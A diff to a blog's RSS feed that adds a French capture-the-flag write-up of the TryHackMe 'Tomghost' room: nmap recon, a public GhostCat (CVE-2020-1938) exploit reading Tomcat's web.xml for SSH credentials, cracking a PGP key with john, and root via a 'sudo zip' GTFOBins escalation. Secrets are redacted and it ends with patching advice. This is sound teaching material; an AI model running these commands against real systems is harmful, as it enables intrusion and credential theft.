@@ -6,8 +6,137 @@
         <generator>Hugo -- gohugo.io</generator>
         <language>en-us</language>
         <copyright>&lt;a href=&#34;https://creativecommons.org/licenses/by-nc/4.0/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;CC BY-NC 4.0&lt;/a&gt;</copyright>
-        <lastBuildDate>Wed, 08 Jul 2020 01:43:30 +0200</lastBuildDate>
+        <lastBuildDate>Wed, 08 Jul 2020 14:50:53 +0200</lastBuildDate>
         <atom:link href="https://blog.hugoblanc.com/posts/index.xml" rel="self" type="application/rss+xml" />
+        
+        <item>
+            <title>Write-up | Tomghost</title>
+            <link>https://blog.hugoblanc.com/posts/tomghost-writeup/</link>
+            <pubDate>Wed, 08 Jul 2020 14:50:53 +0200</pubDate>
+            
+            <guid>https://blog.hugoblanc.com/posts/tomghost-writeup/</guid>
+            <description>Aujourd&amp;rsquo;hui, je m&amp;rsquo;attaque à la box tomghost, sur Try Hack Me. Le nom en dit long sur cette room :)
+Reconnaissance Je fais un nmap directement avec le flag --script vuln, car les tags de la room indiquent un numéro de CVE.
+PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0) |_clamav-exec: ERROR: Script execution failed (use -d to debug) 53/tcp open tcpwrapped |_clamav-exec: ERROR: Script execution failed (use -d to debug) 8009/tcp open ajp13 Apache Jserv (Protocol v1.</description>
+            <content type="html"><![CDATA[<p>Aujourd&rsquo;hui, je m&rsquo;attaque à la box tomghost, sur <a href="https://tryhackme.com">Try Hack Me</a>. Le nom en dit long sur cette room :)</p>
+<h2 id="reconnaissance">Reconnaissance</h2>
+<p>Je fais un <code>nmap</code> directement avec le flag <code>--script vuln</code>, car les tags de la room indiquent un numéro de CVE.</p>
+<pre><code>PORT     STATE SERVICE    VERSION
+22/tcp   open  ssh        OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
+|_clamav-exec: ERROR: Script execution failed (use -d to debug)
+53/tcp   open  tcpwrapped
+|_clamav-exec: ERROR: Script execution failed (use -d to debug)
+8009/tcp open  ajp13      Apache Jserv (Protocol v1.3)
+|_clamav-exec: ERROR: Script execution failed (use -d to debug)
+8080/tcp open  http       Apache Tomcat 9.0.30
+|_clamav-exec: ERROR: Script execution failed (use -d to debug)
+|_http-csrf: Couldn't find any CSRF vulnerabilities.
+|_http-dombased-xss: Couldn't find any DOM based XSS.
+| http-enum: 
+|   /examples/: Sample scripts
+|_  /docs/: Potentially interesting folder
+| http-slowloris-check: 
+|   VULNERABLE:
+|   Slowloris DOS attack
+|     State: LIKELY VULNERABLE
+|     IDs:  CVE:CVE-2007-6750
+|     Disclosure date: 2009-09-17
+|     References:
+|       http://ha.ckers.org/slowloris/
+|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750
+| vulners: 
+|   cpe:/a:apache:tomcat:9.0.30: 
+|       CVE-2020-1938   7.5     https://vulners.com/cve/CVE-2020-1938
+|       CVE-2020-1935   5.8     https://vulners.com/cve/CVE-2020-1935
+|       CVE-2019-17569  5.8     https://vulners.com/cve/CVE-2019-17569
+|       CVE-2020-1745   5.0     https://vulners.com/cve/CVE-2020-1745
+|       CVE-2020-11996  5.0     https://vulners.com/cve/CVE-2020-11996
+|_      CVE-2020-9484   4.4     https://vulners.com/cve/CVE-2020-9484
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</code></pre><p>Comme le nom de la machine laissait imaginer, on va devoir exploiter une vulnérabilité de Apache Tomcat, la CVE-2020-1938, également appelée GhostCat.</p>
+<h2 id="exploitation">Exploitation</h2>
+<p>Afin de pouvoir exploiter cette vulnérabilité, le port AJP (8009) doit être ouvert, ce qui est le cas ici.</p>
+<p>Il ne semble y avoir aucun <em>exploit</em> sur metasploit permettant d&rsquo;exploiter cette vulnérabilité. Il va donc falloir en trouver un sur le net. Heureusement, de nombreuses PoC sont disponibles sur GitHub. J&rsquo;utilise celui de  <a href="https://github.com/00theway/Ghostcat-CNVD-2020-10487">00theway</a>.</p>
+<p>Les serveurs Apache Tomcat ont par défaut un fichier <code>/WEB-INF/web.xml</code>. Je lance donc l&rsquo;<em>exploit</em> pour lire ce fichier :</p>
+<pre><code>$ python3 exploit.py http://10.10.201.10:8080 8009 /WEB-INF/web.xml read
+...
+&lt;web-app xmlns=&quot;http://xmlns.jcp.org/xml/ns/javaee&quot;
+  xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;
+  xsi:schemaLocation=&quot;http://xmlns.jcp.org/xml/ns/javaee
+                      http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd&quot;
+  version=&quot;4.0&quot;
+  metadata-complete=&quot;true&quot;&gt;
+
+  &lt;display-name&gt;Welcome to Tomcat&lt;/display-name&gt;
+  &lt;description&gt;
+     Welcome to GhostCat
+        skyfuck:[edited]
+  &lt;/description&gt;
+
+&lt;/web-app&gt;
+</code></pre><p>On retrouve sur cette page des identifiants. Je les teste donc en SSH, et ça marche !</p>
+<p>Une fois connecté, je vois qu&rsquo;il y a 2 fichiers dans le home dir de l&rsquo;user : <code>credential.pgp</code> et <code>tryhackme.asc</code>.</p>
+<ul>
+<li><code>tryhackme.asc</code> contient une clé privée PGP.</li>
+<li><code>credentials.pgp</code> est un fichier binaire.</li>
+</ul>
+<p>Je les récupère donc sur ma machine pour jouer avec :</p>
+<pre><code>$ scp skyfuck@10.10.201.10:/home/skyfuck/* Documents/tryhackme/tomghost/
+skyfuck@10.10.201.10's password: 
+credential.pgp        100%  394     6.8KB/s   00:00    
+tryhackme.asc         100% 5144    90.1KB/s   00:00
+</code></pre><p>J&rsquo;essaie d&rsquo;importer avec <code>gpg</code>, mais je n&rsquo;ai pas le mot de passe. Qui on appelle quand il est question de craquer des clés ? <code>john</code> !</p>
+<pre><code>$ sudo gpg2john tryhackme.asc &gt; hash
+
+File tryhackme.asc
+
+$ sudo john --wordlist=/usr/share/wordlists/rockyou.txt hash 
+Using default input encoding: UTF-8
+Loaded 1 password hash (gpg, OpenPGP / GnuPG Secret Key [32/64])
+...
+Press 'q' or Ctrl-C to abort, almost any other key for status
+[edited]        (tryhackme)
+Use the &quot;--show&quot; option to display all of the cracked passwords reliably
+Session completed
+</code></pre><p>Yes ! Ça fonctionne ! Je peux alors utiliser <code>gpg</code> :</p>
+<pre><code>$ gpg --decrypt credential.pgp 
+gpg: Attention : l'algorithme de chiffrement CAST5 est introuvable
+            dans les préférences du destinataire
+gpg: chiffré avec une clef ELG de 1024 bits, identifiant 61E104A66184FBCC, créée le 2020-03-11
+      « tryhackme &lt;stuxnet@tryhackme.com&gt; »
+merlin:[edited]
+</code></pre><p>Il y a donc un autre utilisateur sur la machine que <code>skyfuck</code>, je n&rsquo;avais pas pensé à regarder ! Ces identifiants me permettent de me connecter en SSH entant que <code>merlin</code>. Je peux alors lire le flag <code>user.txt</code> :</p>
+<pre><code>$ cat user.txt 
+THM{[edited]}
+</code></pre><h2 id="élévation-de-privilèges">Élévation de privilèges</h2>
+<p>Afin de voir comment je pourrais passer root, j&rsquo;essaie d&rsquo;abord <code>sudo -l</code> :</p>
+<pre><code>User merlin may run the following commands on ubuntu:
+    (root : root) NOPASSWD: /usr/bin/zip
+</code></pre><p>Hmm, étrange&hellip;
+Un petit tour sur <a href="https://gtfobins.github.io/">GTFOBins</a> pour voir ce qu&rsquo;il est possible de faire avec <code>zip</code> :</p>
+<blockquote>
+<p>It runs in privileged context and may be used to access the file system, escalate or maintain access with elevated privileges if enabled on sudo.</p>
+</blockquote>
+<p>Parfait :)</p>
+<pre><code>$ TF=$(mktemp -u)
+$ sudo zip $TF /etc/hosts -T -TT 'sh #'
+  adding: etc/hosts (deflated 31%)
+
+# whoami
+root
+# cat /root/root.txt
+THM{[edited]}
+</code></pre><p>:)</p>
+<h2 id="épilogue--un-point-sur-apache-tomcat-et-la-vulnérabilité-ghostcat">Épilogue : un point sur Apache Tomcat et la vulnérabilité GhostCat</h2>
+<p>Apache Tomcat est un serveur web qui permet d&rsquo;exécuter des applications faites en Java (.jsp&hellip;).</p>
+<p>Dans cette room, j&rsquo;ai exploité le protocole AJP qui est de base sur le port 8009. AJP (pour Apache JServ Protocol) permet la communication entre un serveur web Apache (qui reçoit les requêtes HTTP) et un serveur Tomcat (qui gère les applications Java). Le serveur Apache traduit les requêtes HTTP en requêtes AJP pour que Tomcat puisse les interpréter.</p>
+<p>Le problème ici est que le port sur lequel tourne AJP est visible de l&rsquo;extérieur. Or, le serveur Tomcat considère toutes les requêtes AJP comme étant légitimes. Dans ces requêtes, il y a un champ URI qui contient une chaine de caractères entrée par l&rsquo;utilisateur. Les requêtes AJP étant considérées comme sûres par Tomcat, ce champ n&rsquo;est pas controllé, ce qui permet à un attaquant de lire ou écrire des fichiers déjà présent sur le serveur. C&rsquo;est ce que j&rsquo;ai fait ici, en lisant le fichier <code>/WEB-INF/web.xml</code>.</p>
+<p>Aujourd&rsquo;hui, cette vulnérabilité est patchée, donc les mises à jour suffisent à éviter ce problème. Cependant, Apache Tomcat a de nombreuses vulnérabilités qui sont découvertes chaque année, et beaucoup d&rsquo;entre elles sont faciles à exploiter, les <em>exploits</em> étant publics :</p>
+<pre><code>$ searchsploit tomcat | wc -l
+68
+</code></pre><p>Morale de l&rsquo;histoire : faites vos mises à jour et utilisez des pare-feux :)</p>
+]]></content>
+        </item>
         
         <item>
             <title>Write-up | CTF Collection Vol.1</title>
